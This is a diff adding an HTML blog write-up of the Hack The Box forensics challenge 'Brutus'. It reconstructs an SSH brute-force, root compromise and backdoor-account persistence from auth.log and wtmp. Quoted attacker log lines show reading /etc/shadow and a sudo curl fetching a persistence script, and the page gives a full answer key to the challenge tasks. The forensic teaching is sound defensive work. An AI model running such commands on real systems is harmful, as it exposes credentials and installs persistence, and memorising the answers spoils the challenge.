@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>HTB Sherlock: Brutus — Nguyen Thai Ngoc</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <style>
+    @media (min-width: 1101px){.htb-brutus-page .article-layout{display:grid!important;grid-template-columns:300px minmax(0,1fr)!important;gap:34px!important;align-items:start!important;width:min(1280px,calc(100% - 48px))!important;max-width:1280px!important;margin:0 auto!important}.htb-brutus-page .toc{position:sticky!important;top:96px!important;width:300px!important;height:calc(100vh - 118px)!important;max-height:calc(100vh - 118px)!important;margin:0!important;padding:24px 22px!important;overflow-y:auto!important;border:1px solid rgba(125,200,255,.18)!important;border-radius:34px!important;background:linear-gradient(180deg,rgba(8,24,52,.92),rgba(5,16,36,.86))!important;box-shadow:0 16px 42px rgba(0,0,0,.24),inset 0 1px 0 rgba(255,255,255,.035)!important}.htb-brutus-page .article-card{width:100%!important;max-width:none!important;margin:0!important;padding:34px!important;border-radius:34px!important}}
+    @media (max-width:1100px){.htb-brutus-page .article-layout{display:block!important;width:min(100%,calc(100% - 28px))!important;margin:0 auto!important}.htb-brutus-page .toc{position:static!important;width:100%!important;margin:0 0 24px 0!important;padding:20px 18px!important;border:1px solid rgba(125,200,255,.16)!important;border-radius:28px!important;background:linear-gradient(180deg,rgba(8,24,52,.90),rgba(5,16,36,.84))!important}.htb-brutus-page .article-card{padding:24px!important}}
+    .htb-brutus-page .toc-title{margin:0 0 16px 0;padding-bottom:14px;border-bottom:1px solid rgba(125,200,255,.14);color:rgba(180,210,235,.86);font-family:"JetBrains Mono",monospace;font-size:11px;font-weight:900;letter-spacing:.22em;text-transform:uppercase}.htb-brutus-page .toc a{display:block;margin:4px 0;padding:10px 12px;border-radius:15px;color:#bfe8ff;font-size:15px;font-weight:700;line-height:1.45}.htb-brutus-page .toc a:hover,.htb-brutus-page .toc a.active{background:rgba(86,199,255,.10);color:#7feaff}.evidence-shot{margin:22px 0 30px;overflow:hidden;border:1px solid rgba(100,210,255,.17);border-radius:24px;background:rgba(2,8,18,.82);box-shadow:0 18px 40px rgba(0,0,0,.24)}.evidence-shot figcaption{display:flex;justify-content:space-between;gap:14px;padding:12px 16px;border-bottom:1px solid rgba(125,200,255,.13);color:rgba(220,245,255,.88);font-family:"JetBrains Mono",monospace;font-size:12px;font-weight:800}.terminal-window{padding:16px;overflow-x:auto;color:#d8f7ff;font-family:"JetBrains Mono",monospace;font-size:13px;line-height:1.55;white-space:pre;background:radial-gradient(circle at 20% 0%,rgba(0,216,255,.10),transparent 32%),linear-gradient(180deg,rgba(1,12,27,.98),rgba(1,7,16,.98))}.cmd{color:#6fffe8;font-weight:800}.hit{color:#ff5c7a;font-weight:900}.ip{color:#7feaff;font-weight:900}.user{color:#ffd36e;font-weight:900}.ok{color:#7CFF9B;font-weight:900}.timeline-table{width:100%;border-collapse:collapse;margin:18px 0 28px;overflow:hidden;border-radius:20px;border:1px solid rgba(125,200,255,.16)}.timeline-table th,.timeline-table td{padding:13px 14px;border-bottom:1px solid rgba(125,200,255,.10);vertical-align:top}.timeline-table th{color:#7feaff;text-align:left;font-family:"JetBrains Mono",monospace;font-size:12px;text-transform:uppercase;letter-spacing:.08em;background:rgba(86,199,255,.08)}.answer-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px;margin:20px 0}@media (max-width:760px){.answer-grid{grid-template-columns:1fr}}.answer-card{padding:16px;border:1px solid rgba(125,200,255,.16);border-radius:22px;background:rgba(8,24,52,.48)}.answer-card .q{color:rgba(200,230,245,.74);font-size:13px;font-weight:700;margin-bottom:8px}.answer-card code{color:#7feaff}
+  </style>
+</head>
+<body>
+  <header class="topbar"><div class="wrap topbar-inner"><a class="brand" href="/">ThaiNgoc :~$</a><nav class="nav"><a href="/">Home</a><a class="active" href="/writeups/">Writeups</a><a href="/projects/">Projects</a><a href="/achievements/">Achievements</a><a href="/contact/">Contact</a></nav></div></header>
+  <main class="page htb-brutus-page"><div class="wrap article-layout"><aside class="toc"><div class="toc-title">On this page</div><a href="#overview">Overview</a><a href="#artifacts">Artifacts</a><a href="#bruteforce">SSH Brute Force</a><a href="#wtmp">wtmp Sessions</a><a href="#persistence">Persistence</a><a href="#commands">Sudo Evidence</a><a href="#timeline">Timeline</a><a href="#answers">Task Answers</a><a href="#lessons">Lessons</a></aside>
+  <article class="article-card glass">
+    <div class="eyebrow">Hack The Box Sherlock · Linux Forensics / Log Analysis</div>
+    <h1 class="page-title">HTB Sherlock: Brutus</h1>
+    <p class="lead">A detailed investigation of Unix <code>auth.log</code> and <code>wtmp</code> artifacts to reconstruct an SSH brute-force attack, root compromise, privileged account creation and post-compromise command evidence.</p>
+    <div class="info-card"><div class="item"><div class="label">Challenge</div><div class="value">Brutus</div></div><div class="item"><div class="label">Platform</div><div class="value">Hack The Box</div></div><div class="item"><div class="label">Type</div><div class="value accent">Sherlock</div></div><div class="item"><div class="label">Difficulty</div><div class="value">Very Easy</div></div><div class="item"><div class="label">Artifacts</div><div class="value">auth.log, wtmp, utmp.py</div></div><div class="item"><div class="label">Focus</div><div class="value">SSH brute force & persistence</div></div></div>
+    <div class="callout"><strong>Investigation Goal</strong> Determine the brute-force source IP, compromised account, interactive session time, persistence account and privileged command evidence.</div>
+
+    <h2 id="overview">Scenario Overview</h2><p>The Sherlock provides Linux authentication artifacts from a Confluence server. The goal is to move beyond simply finding failed SSH logins and reconstruct the attacker activity from initial brute-force attempts to persistence.</p>
+    <h2 id="artifacts">Artifacts and First Look</h2><p>After extracting <code>Brutus.zip</code>, the working directory contained <code>auth.log</code>, <code>utmp.py</code> and <code>wtmp</code>. I first inspected <code>auth.log</code> manually to understand the syslog structure before extracting fields.</p>
+    <figure class="evidence-shot"><figcaption><span>Evidence 01</span><span>Initial artifact review</span></figcaption><div class="terminal-window"><span class="cmd">$ ls -la</span>
+-rwxrwxrwx 1 tngoc tngoc 43911 Mar  6  2024 auth.log
+-rwxrwxrwx 1 tngoc tngoc  3154 Apr 30  2025 utmp.py
+-rwxrwxrwx 1 tngoc tngoc 11136 Mar  6  2024 wtmp
+
+<span class="cmd">$ cat auth.log</span>
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
+Mar  6 06:18:01 ip-172-31-35-28 CRON[1119]: pam_unix(cron:session): session closed for user confluence</div></figure>
+
+    <h2 id="bruteforce">Finding the SSH Brute-force Source</h2><p>Filtering for accepted SSH events showed multiple successful password logins. The IP <code>65.2.161.68</code> appeared as <code>root</code> and later as <code>cyberjunkie</code>, making it the strongest candidate for the attacker source.</p>
+    <figure class="evidence-shot"><figcaption><span>Evidence 02</span><span>Accepted SSH logins</span></figcaption><div class="terminal-window"><span class="cmd">$ cat auth.log | grep "Accepted"</span>
+Mar  6 06:19:54 sshd[1465]: <span class="ok">Accepted password</span> for <span class="user">root</span> from 203.101.190.9 port 42825 ssh2
+Mar  6 06:31:40 sshd[2411]: <span class="ok">Accepted password</span> for <span class="user">root</span> from <span class="ip">65.2.161.68</span> port 34782 ssh2
+Mar  6 06:32:44 sshd[2491]: <span class="ok">Accepted password</span> for <span class="user">root</span> from <span class="ip">65.2.161.68</span> port 53184 ssh2
+Mar  6 06:37:34 sshd[2667]: <span class="ok">Accepted password</span> for <span class="user">cyberjunkie</span> from <span class="ip">65.2.161.68</span> port 43260 ssh2</div></figure>
+    <p>Then I removed <code>invalid user</code> attempts to focus on valid local accounts. The remaining failed attempts targeted <code>backup</code> and <code>root</code>.</p>
+    <figure class="evidence-shot"><figcaption><span>Evidence 03</span><span>Valid users targeted</span></figcaption><div class="terminal-window"><span class="cmd">$ grep -i "failed password" auth.log | grep -v invalid | cut -d ' ' -f 10 | sort | uniq -c | sort -nr</span>
+      9 <span class="user">backup</span>
+      6 <span class="user">root</span>
+
+<span class="cmd">$ grep -i "failed password" auth.log | grep -v invalid | cut -d ' ' -f 1,4,10,12</span>
+Mar 06:31:33 backup <span class="ip">65.2.161.68</span>
+Mar 06:31:39 root   <span class="ip">65.2.161.68</span>
+Mar 06:31:41 root   <span class="ip">65.2.161.68</span>
+Mar 06:31:42 backup <span class="ip">65.2.161.68</span></div></figure>
+    <p>The failed attempts and the successful <code>root</code> authentication are close together in time, so the brute-force activity from <code>65.2.161.68</code> successfully compromised <code>root</code>.</p>
+
+    <h2 id="wtmp">Confirming the Manual Session with wtmp</h2><p>The task asks for the manual login time, which is different from the authentication time. For that, I parsed the binary <code>wtmp</code> artifact with <code>utmpdump</code>.</p>
+    <figure class="evidence-shot"><figcaption><span>Evidence 04</span><span>wtmp session confirmation</span></figcaption><div class="terminal-window"><span class="cmd">$ utmpdump wtmp</span>
+[7] [01583] [ts/0] [root]        [pts/0] [203.101.190.9] [203.101.190.9] [2024-03-06T06:19:55,151913+00:00]
+[7] [02549] [ts/1] [root]        [pts/1] [<span class="ip">65.2.161.68</span>]   [<span class="ip">65.2.161.68</span>]   [<span class="ok">2024-03-06T06:32:45</span>,387923+00:00]
+[8] [02491] [    ] [            ] [pts/1] [              ] [0.0.0.0]       [2024-03-06T06:37:24,590579+00:00]
+[7] [02667] [ts/1] [cyberjunkie] [pts/1] [<span class="ip">65.2.161.68</span>]   [<span class="ip">65.2.161.68</span>]   [2024-03-06T06:37:35,475575+00:00]</div></figure>
+
+    <h2 id="persistence">Persistence Through a New Local Account</h2><p>Searching for <code>cyberjunkie</code> showed the account was created after the root session began. It was given a home directory, shell, password and sudo group membership.</p>
+    <figure class="evidence-shot"><figcaption><span>Evidence 05</span><span>cyberjunkie account creation</span></figcaption><div class="terminal-window"><span class="cmd">$ grep -i cyberjunkie auth.log</span>
+Mar  6 06:34:18 groupadd[2586]: new group: name=<span class="user">cyberjunkie</span>, GID=1002
+Mar  6 06:34:18 useradd[2592]: new user: name=<span class="user">cyberjunkie</span>, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash
+Mar  6 06:34:18 passwd[2603]: pam_unix(passwd:chauthtok): password changed for <span class="user">cyberjunkie</span>
+Mar  6 06:35:15 usermod[2628]: add '<span class="user">cyberjunkie</span>' to group 'sudo'
+Mar  6 06:37:34 sshd[2667]: <span class="ok">Accepted password</span> for <span class="user">cyberjunkie</span> from <span class="ip">65.2.161.68</span> port 43260 ssh2</div></figure>
+    <p>This maps to MITRE ATT&amp;CK <code>T1136.001 - Create Account: Local Account</code>.</p>
+
+    <h2 id="commands">Sudo Command Evidence</h2><p>The sudo logs showed two important post-compromise actions: reading a sensitive credential file and later retrieving a script from GitHub using elevated privileges.</p>
+    <figure class="evidence-shot"><figcaption><span>Evidence 06</span><span>Privileged command evidence</span></figcaption><div class="terminal-window">Mar  6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=<span class="hit">&#47;usr&#47;bin&#47;cat &#47;etc&#47;shadow</span>
+Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=<span class="hit">&#47;usr&#47;bin&#47;curl https:&#47;&#47;raw.githubusercontent.com&#47;montysecurity&#47;linper&#47;main&#47;linper.sh</span></div></figure>
+    <p>The full sudo command required by the task is:</p><pre><code>&#47;usr&#47;bin&#47;curl https:&#47;&#47;raw.githubusercontent.com&#47;montysecurity&#47;linper&#47;main&#47;linper.sh</code></pre>
+
+    <h2 id="timeline">Attack Timeline</h2><table class="timeline-table"><thead><tr><th>UTC Time</th><th>Event</th><th>Interpretation</th></tr></thead><tbody><tr><td><code>06:31:33 - 06:31:42</code></td><td>Failed SSH attempts from <code>65.2.161.68</code></td><td>Brute-force against valid users.</td></tr><tr><td><code>06:31:40</code></td><td>Accepted password for <code>root</code></td><td>Root account compromised.</td></tr><tr><td><code>06:32:45</code></td><td><code>wtmp</code> shows <code>root</code> on <code>pts/1</code></td><td>Manual terminal session established.</td></tr><tr><td><code>06:34:18</code></td><td><code>cyberjunkie</code> created</td><td>Persistence account creation.</td></tr><tr><td><code>06:35:15</code></td><td><code>cyberjunkie</code> added to <code>sudo</code></td><td>Elevated privilege granted.</td></tr><tr><td><code>06:37:24</code></td><td>Root SSH session ended</td><td>First interactive attacker session closed.</td></tr><tr><td><code>06:37:34</code></td><td><code>cyberjunkie</code> logged in</td><td>Attacker switched to the backdoor account.</td></tr><tr><td><code>06:39:38</code></td><td>Sudo curl command executed</td><td>Post-compromise script retrieval.</td></tr></tbody></table>
+
+    <h2 id="answers">Task Answers</h2><div class="answer-grid"><div class="answer-card"><div class="q">Task 1 · Brute-force IP</div><code>65.2.161.68</code></div><div class="answer-card"><div class="q">Task 2 · Compromised account</div><code>root</code></div><div class="answer-card"><div class="q">Task 3 · Manual login timestamp</div><code>2024-03-06 06:32:45</code></div><div class="answer-card"><div class="q">Task 4 · Session number</div><code>37</code></div><div class="answer-card"><div class="q">Task 5 · Persistence account</div><code>cyberjunkie</code></div><div class="answer-card"><div class="q">Task 6 · MITRE sub-technique</div><code>T1136.001</code></div><div class="answer-card"><div class="q">Task 7 · First SSH session end</div><code>2024-03-06 06:37:24</code></div><div class="answer-card"><div class="q">Task 8 · Sudo command</div><code>&#47;usr&#47;bin&#47;curl https:&#47;&#47;raw.githubusercontent.com&#47;montysecurity&#47;linper&#47;main&#47;linper.sh</code></div></div>
+
+    <h2 id="lessons">Lessons Learned</h2><p>This lab shows why <code>auth.log</code> is useful beyond brute-force detection. It reveals SSH authentication, session creation, account management and sudo command evidence. <code>wtmp</code> then confirms actual interactive login sessions and timing.</p><div class="callout"><strong>Final Conclusion</strong> The attacker brute-forced SSH from <code>65.2.161.68</code>, compromised <code>root</code>, created a privileged local account named <code>cyberjunkie</code>, and used that account for continued access and elevated command execution.</div>
+  </article></div></main>
+  <script src="/assets/js/main.js"></script><script>function initCyberBackground(){const prefersReducedMotion=window.matchMedia("(prefers-reduced-motion: reduce)").matches;removeOldBackgrounds();document.body.classList.remove("home-bg-mode");document.body.classList.add("writeups-bg-mode");if(prefersReducedMotion||window.innerWidth<=760)return;initWriteupBackground(false);}</script>
+</body>
+</html>
